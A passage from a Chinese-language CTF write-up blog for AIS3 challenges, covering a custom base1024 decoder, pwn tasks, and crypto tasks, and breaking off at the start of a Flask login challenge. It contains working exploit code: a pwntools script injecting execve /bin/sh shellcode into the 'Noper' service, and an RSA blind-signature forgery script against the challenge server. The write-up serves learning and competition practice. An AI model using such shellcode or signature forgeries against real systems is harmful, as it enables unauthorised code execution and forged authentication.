+		<span style="color:#75715e">// bit 6 to 8 bit determines color
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// bit 9 determines ???
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// bit 0 to 5 determines char
+</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">TAG</span>(<span style="color:#a6e22e">x</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x6</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7</span>, <span style="color:#a6e22e">x</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x9</span>, <span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">b3</span>)[<span style="color:#a6e22e">x</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3f</span>]);
+    }
+    <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">rest</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#a6e22e">rest</span><span style="color:#f92672">--</span>) {
+        <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">TAG</span>(<span style="color:#a6e22e">rest</span> <span style="color:#f92672">%</span> <span style="color:#a6e22e">eight</span>, <span style="color:#ae81ff">0x0</span>, <span style="color:#e6db74">&#39;=&#39;</span>);
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
+}
+</code></pre></div><p>每五個字元會把Ascii延伸到8-bit之後再接起來，這樣是一團40-bit的資訊</p>
+<p>然後以10-bit為一單位編碼成四個字元</p>
+<p>10-bit的用法是：</p>
+<ul>
+<li>bit 0-5 從64個字元選一種</li>
+<li>bit 6-8 從8種顏色選一種</li>
+<li>bit 9 不知道在幹麻我也懶的弄清楚</li>
+</ul>
+<p>接下來就是把encoded flag的資訊抓下來然後寫decoder：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">enc</span> <span style="color:#f92672">=</span> [
+	<span style="color:#e6db74">&#34;04B&#34;</span>, <span style="color:#e6db74">&#34;02g&#34;</span>, <span style="color:#e6db74">&#34;03i&#34;</span>, <span style="color:#e6db74">&#34;15J&#34;</span>, <span style="color:#75715e">// 40 bits of data
+</span><span style="color:#75715e"></span>	<span style="color:#e6db74">&#34;066&#34;</span>, <span style="color:#e6db74">&#34;10\\&#34;</span>, <span style="color:#e6db74">&#34;03w&#34;</span>, <span style="color:#e6db74">&#34;041&#34;</span>,
+	<span style="color:#e6db74">&#34;03A&#34;</span>, <span style="color:#e6db74">&#34;14j&#34;</span>, <span style="color:#e6db74">&#34;04\\&#34;</span>, <span style="color:#e6db74">&#34;141&#34;</span>,
+	<span style="color:#e6db74">&#34;03g&#34;</span>, <span style="color:#e6db74">&#34;07u&#34;</span>, <span style="color:#e6db74">&#34;03i&#34;</span>, <span style="color:#e6db74">&#34;01k&#34;</span>,
+	<span style="color:#e6db74">&#34;03l&#34;</span>, <span style="color:#e6db74">&#34;047&#34;</span>, <span style="color:#e6db74">&#34;06x&#34;</span>, <span style="color:#e6db74">&#34;05i&#34;</span>,
+	<span style="color:#e6db74">&#34;05X&#34;</span>, <span style="color:#e6db74">&#34;01K&#34;</span>, <span style="color:#e6db74">&#34;01I&#34;</span>, <span style="color:#e6db74">&#34;04h&#34;</span>,
+	<span style="color:#e6db74">&#34;05X&#34;</span>, <span style="color:#e6db74">&#34;00K&#34;</span>, <span style="color:#e6db74">&#34;14i&#34;</span>, <span style="color:#e6db74">&#34;15l&#34;</span>,
+	<span style="color:#e6db74">&#34;076&#34;</span>, <span style="color:#e6db74">&#34;07f&#34;</span>, <span style="color:#e6db74">&#34;04o&#34;</span>, <span style="color:#e6db74">&#34;016&#34;</span>,
+	<span style="color:#e6db74">&#34;055&#34;</span>, <span style="color:#e6db74">&#34;07K&#34;</span>, <span style="color:#e6db74">&#34;11n&#34;</span>, <span style="color:#e6db74">&#34;158&#34;</span>,
+	<span style="color:#e6db74">&#34;077&#34;</span>, <span style="color:#e6db74">&#34;14B&#34;</span>, <span style="color:#e6db74">&#34;05-&#34;</span>, <span style="color:#e6db74">&#34;118&#34;</span>,
+	<span style="color:#e6db74">&#34;04w&#34;</span>, <span style="color:#e6db74">&#34;13a&#34;</span>, <span style="color:#e6db74">&#34;01r&#34;</span>, <span style="color:#e6db74">&#34;14z&#34;</span>,
+	<span style="color:#e6db74">&#34;07K&#34;</span>, <span style="color:#e6db74">&#34;03=&#34;</span>, <span style="color:#e6db74">&#34;02=&#34;</span>, <span style="color:#e6db74">&#34;01=&#34;</span>,
+];
+
+<span style="color:#a6e22e">b64</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AlS3{BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}&#34;</span> <span style="color:#75715e">// 64 chars
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+
+<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">seg</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">seg</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">enc</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">seg</span><span style="color:#f92672">+=</span><span style="color:#ae81ff">4</span>) {
+	<span style="color:#a6e22e">bits</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+		<span style="color:#a6e22e">bits</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">enc</span>[<span style="color:#a6e22e">seg</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">0</span>];
+		<span style="color:#a6e22e">bits</span> <span style="color:#f92672">+=</span> (parseInt(<span style="color:#a6e22e">enc</span>[<span style="color:#a6e22e">seg</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">1</span>])<span style="color:#f92672">&gt;&gt;&gt;</span><span style="color:#ae81ff">0</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">2</span>).<span style="color:#a6e22e">padStart</span>(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
+		<span style="color:#a6e22e">bits</span> <span style="color:#f92672">+=</span> (<span style="color:#a6e22e">b64</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#a6e22e">enc</span>[<span style="color:#a6e22e">seg</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">2</span>])<span style="color:#f92672">&gt;&gt;&gt;</span><span style="color:#ae81ff">0</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">2</span>).<span style="color:#a6e22e">padStart</span>(<span style="color:#ae81ff">6</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
+	}
+	<span style="color:#a6e22e">bits</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bits</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/.{1,8}/g</span>);
+	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
+		<span style="color:#a6e22e">flag</span> <span style="color:#f92672">+=</span> String.<span style="color:#a6e22e">fromCharCode</span>(parseInt(<span style="color:#a6e22e">bits</span>[<span style="color:#a6e22e">i</span>], <span style="color:#ae81ff">2</span>))
+}
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">flag</span>);
+</code></pre></div><p>很多人(我也有份)一開始上傳</p>
+<p><code>AlS3{BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}</code></p>
+<p>一直到官方出來澄清這不是Flag別再傳了&hellip;</p>
+<p>然後寫完才想到其實decoder用Python寫就好了，幹麻繼續寫JS折磨自己 XD</p>
+<p><code>AIS3{base1024_15_c0l0RFuL_GAM3_CL3Ar_thIS_IS_y0Ur_FlaG!}</code></p>
+<hr>
+<h1 id="pwn">
+  PWN
+  <a class="heading-link" href="#pwn">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<h2 id="write-me">
+  Write Me
+  <a class="heading-link" href="#write-me">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>話說GOT Hijacking不是應該會和ROP一起出成某個模板題嗎？</p>
+<p>像這題這麼直白的問法我還是第一次看到</p>
+<p>flag 放在home/gotplt/flag</p>
+<p><code>AIS3{Y0u_know_h0w_1@2y_b1nd1ng_w@rking}</code></p>
+<hr>
+<h2 id="noper">
+  Noper
+  <a class="heading-link" href="#noper">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>一開始</p>
+<p>看了老半天才發現他根本沒做過srand(time(NULL))</p>
+<p>這種時候相當於用srand(1)初始化</p>
+<p>所以本機和伺服器上每次執行時填NOP的位置都一樣</p>
+<p>接下來就是把payload裡的opcode分段塞進不會被填NOP的縫隙裡</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;info&#39;</span>
+binary <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./noper&#39;</span>)
+
+<span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;quiz.ais3.org&#39;</span>, <span style="color:#ae81ff">5002</span>)
+<span style="color:#66d9ef">else</span>:
+    p <span style="color:#f92672">=</span> process(binary<span style="color:#f92672">.</span>path)
+
+<span style="color:#75715e"># NOP in payload: 6, 10, 13, 17, 39, 41, 44, 51, 63</span>
+payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xd2\x90\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 0 - 7</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 8  - 17</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 18 - 27</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 28 - 37</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 38 - 44</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\xe6\xb0\x3b\x90\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 45 - 51</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\x05</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 52 - 53</span>
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;code:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>flag 放在 home/noper/flag</p>
+<p><code>AIS3{nOp_noOp_NOoop!!!}</code></p>
+<p>這一題是首殺、豪爽</p>
+<hr>
+<h1 id="crypto">
+  CRYPTO
+  <a class="heading-link" href="#crypto">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<h2 id="microchip">
+  Microchip
+  <a class="heading-link" href="#microchip">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;python.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+def <span style="color:#a6e22e">track</span>(name, id) <span style="color:#f92672">-&gt;</span> str <span style="color:#960050;background-color:#1e0010">꞉</span>                                                    {
+
+    <span style="color:#66d9ef">if</span> len(name) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#960050;background-color:#1e0010">꞉</span>                                                     ){
+        padded <span style="color:#f92672">=</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;4444&#34;</span>                                                  ;}
+    elif len(name) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#960050;background-color:#1e0010">꞉</span>                                                   ){
+        padded <span style="color:#f92672">=</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;333&#34;</span>                                                   ;}
+    elif len(name) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> <span style="color:#960050;background-color:#1e0010">꞉</span>                                                   ){
+        padded <span style="color:#f92672">=</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;22&#34;</span>                                                    ;}
+    elif len(name) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> <span style="color:#960050;background-color:#1e0010">꞉</span>                                                   ){
+        padded <span style="color:#f92672">=</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;1&#34;</span>                                                     ;}
+
+    keys <span style="color:#f92672">=</span> list()                                                               ;
+    temp <span style="color:#f92672">=</span> id                                                                   ;
+    <span style="color:#66d9ef">for</span> i in range(<span style="color:#ae81ff">4</span>) <span style="color:#960050;background-color:#1e0010">꞉</span>                                                         ){
+        keys.append(temp <span style="color:#f92672">%</span> <span style="color:#ae81ff">96</span>)                                                  ;
+        temp <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(temp <span style="color:#f92672">/</span> <span style="color:#ae81ff">96</span>)                                                   ;}
+
+    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>                                                                 ;
+    <span style="color:#66d9ef">for</span> i in range(<span style="color:#ae81ff">0</span>, len(padded), <span style="color:#ae81ff">4</span>) <span style="color:#960050;background-color:#1e0010">꞉</span>                                         ){
+
+        nums <span style="color:#f92672">=</span> list()                                                           ;
+        <span style="color:#66d9ef">for</span> j in range(<span style="color:#ae81ff">4</span>) <span style="color:#960050;background-color:#1e0010">꞉</span>                                                     ){
+            num <span style="color:#f92672">=</span> ord(padded[i <span style="color:#f92672">+</span> j]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">32</span>                                       ;
+            num <span style="color:#f92672">=</span> (num <span style="color:#f92672">+</span> keys[j]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">96</span>                                          ;
+            nums.append(num <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>)                                               ;}
+
+        result <span style="color:#f92672">+=</span> chr(nums[<span style="color:#ae81ff">3</span>])                                                  ;
+        result <span style="color:#f92672">+=</span> chr(nums[<span style="color:#ae81ff">2</span>])                                                  ;
+        result <span style="color:#f92672">+=</span> chr(nums[<span style="color:#ae81ff">1</span>])                                                  ;
+        result <span style="color:#f92672">+=</span> chr(nums[<span style="color:#ae81ff">0</span>])                                                  ;}
+
+    <span style="color:#66d9ef">return</span> result                                                               ;}
+
+
+def <span style="color:#a6e22e">main</span>() <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">int</span> <span style="color:#960050;background-color:#1e0010">꞉</span>                                                             {
+
+    name <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>).read().strip()                                 ;
+    id <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(input(<span style="color:#e6db74">&#34;key = &#34;</span>))                                                   ;
+
+    print(<span style="color:#e6db74">&#34;result is:&#34;</span>, track(name, id))                                        ;
+	<span style="color:#75715e">//     result is: =Js&amp;;*A`odZHi&#39;&gt;D=Js&amp;#i-DYf&gt;Uy&#39;yuyfyu&lt;)Gu
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>                                                                    ;}
+
+</code></pre></div><p>這也太變態了吧</p>
+<p>幸好</p>
+<p>把key bruteforce出來再拿去decrypt就好了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;=Js&amp;;*A`odZHi&#39;&gt;D=Js&amp;#i-DYf&gt;Uy&#39;yuyfyu&lt;)Gu&#34;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brutekeys</span>(p, c):
+    keys <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
+        <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">95</span>):
+            <span style="color:#66d9ef">if</span> ((ord(p[i])<span style="color:#f92672">-</span><span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> key) <span style="color:#f92672">%</span> <span style="color:#ae81ff">96</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">==</span> ord(c[<span style="color:#ae81ff">3</span><span style="color:#f92672">-</span>i]):
+                keys<span style="color:#f92672">.</span>append(key)
+    <span style="color:#66d9ef">return</span> keys
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dec</span>(cipher, keys):
+    plain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
+        plain <span style="color:#f92672">+=</span> chr(((ord(cipher[<span style="color:#ae81ff">3</span><span style="color:#f92672">-</span>i])<span style="color:#f92672">-</span><span style="color:#ae81ff">32</span>) <span style="color:#f92672">-</span> keys[i]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">96</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>)
+    <span style="color:#66d9ef">return</span> plain
+
+keys <span style="color:#f92672">=</span> brutekeys(<span style="color:#e6db74">&#39;AIS3&#39;</span>, cipher[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>])
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(cipher)<span style="color:#f92672">//</span><span style="color:#ae81ff">4</span>):
+    flag <span style="color:#f92672">+=</span> dec(cipher[<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i:<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)], keys)
+<span style="color:#66d9ef">print</span>(flag)
+</code></pre></div><p><code>AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}</code></p>
+<hr>
+<h2 id="resident-evil-village">
+  ReSident evil villAge
+  <a class="heading-link" href="#resident-evil-village">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>簡單來說就是用RSA幫你簽任意字串(blind signing)</p>
+<p>但是不會幫你簽&quot;Ethan Winters&rdquo;</p>
+<p>我們需要偽造一份用server的私鑰簽&quot;Ethan Winters&quot;的數位簽證</p>
+<p>做到的話就給Flag</p>
+<p>題目主要邏輯：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">	<span style="color:#66d9ef">if</span> option <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>: <span style="color:#75715e"># Sign a message</span>
+		self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Name (in hex): &#39;</span>)
+		msg <span style="color:#f92672">=</span> unhexlify(self<span style="color:#f92672">.</span>recv())
+		<span style="color:#66d9ef">if</span> msg <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Ethan Winters&#39;</span> <span style="color:#f92672">or</span> bytes_to_long(msg) <span style="color:#f92672">&gt;=</span> n:  <span style="color:#75715e"># msg+k*n not allowed</span>
+			self<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Nice try!&#39;</span>)
+		<span style="color:#66d9ef">else</span>:
+			sig <span style="color:#f92672">=</span> pow(bytes_to_long(msg), privkey<span style="color:#f92672">.</span>d, n)
+            <span style="color:#75715e"># TODO: Apply hashing first to prevent forgery</span>
+			self<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Signature: &#39;</span> <span style="color:#f92672">+</span> str(sig)<span style="color:#f92672">.</span>encode())
+
+	<span style="color:#66d9ef">elif</span> option <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>: <span style="color:#75715e"># Verify a signed message</span>
+		self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Signature: &#39;</span>)
+		sig <span style="color:#f92672">=</span> int(self<span style="color:#f92672">.</span>recv())
+		verified <span style="color:#f92672">=</span> (pow(sig, e, n) <span style="color:#f92672">==</span> bytes_to_long(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Ethan Winters&#39;</span>))
+		<span style="color:#66d9ef">if</span> verified:
+			self<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;AIS3{THIS_IS_A_FAKE_FLAG}&#39;</span>)
+		<span style="color:#66d9ef">else</span>:
+			self<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Well done!&#39;</span>)
+</code></pre></div><p>官方還很好心在TODO那個地方放一個提示</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long, inverse
+
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;info&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">inverse_mod</span>(a, m):
+    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, m):
+        <span style="color:#66d9ef">if</span> (((a<span style="color:#f92672">%</span>m) <span style="color:#f92672">*</span> (x<span style="color:#f92672">%</span>m)) <span style="color:#f92672">%</span> m <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>):
+            <span style="color:#66d9ef">return</span> x
+    <span style="color:#66d9ef">assert</span>(False)
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;quiz.ais3.org&#39;</span>, <span style="color:#ae81ff">42069</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;n = &#39;</span>)
+n <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline())
+e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;n = &#39;</span> <span style="color:#f92672">+</span> hex(n))
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;3) exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+r <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span> <span style="color:#75715e"># blinding factor, can be anything</span>
+m <span style="color:#f92672">=</span> bytes_to_long(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Ethan Winters&#39;</span>)
+M <span style="color:#f92672">=</span> (pow(r, e, n) <span style="color:#f92672">*</span> m ) <span style="color:#f92672">%</span> n    <span style="color:#75715e"># M === (r^e) * m mod n</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1&#39;</span>) <span style="color:#75715e"># sign M</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;(in hex): &#39;</span>)
+p<span style="color:#f92672">.</span>sendline(hex(M)[<span style="color:#ae81ff">2</span>:])
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Signature: &#39;</span>)
+S <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline())          <span style="color:#75715e"># S === M^d mod n</span>
+
+s <span style="color:#f92672">=</span> (S <span style="color:#f92672">*</span> inverse(r, n)) <span style="color:#f92672">%</span> n
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;s = &#39;</span> <span style="color:#f92672">+</span> hex(s))
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;3) exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>) <span style="color:#75715e"># verify with s</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Signature: &#39;</span>)
+p<span style="color:#f92672">.</span>sendline(str(s))
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><code>AIS3{R3M383R_70_HAsh_7h3_M3Ssa93_83F0r3_S19N1N9}</code></p>
+<hr>
+<h1 id="web">
+  WEB
+  <a class="heading-link" href="#web">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<h2 id="yet-another-login-page">
+  Yet Another Login Page
+  <a class="heading-link" href="#yet-another-login-page">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, make_response, redirect, session, render_template, send_file
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> json
+
+app <span style="color:#f92672">=</span> Flask(__name__)
+app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">32</span>)
+
+FLAG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;FLAG&#39;</span>, <span style="color:#e6db74">&#39;AIS3{TEST_FLAG}&#39;</span>)
+users_db <span style="color:#f92672">=</span> {
+    <span style="color:#e6db74">&#39;guest&#39;</span>: <span style="color:#e6db74">&#39;guest&#39;</span>,
+    <span style="color:#e6db74">&#39;admin&#39;</span>: os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;S3CR3T_P455W0RD&#39;</span>)
+}
+
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">valid_user</span>(user):
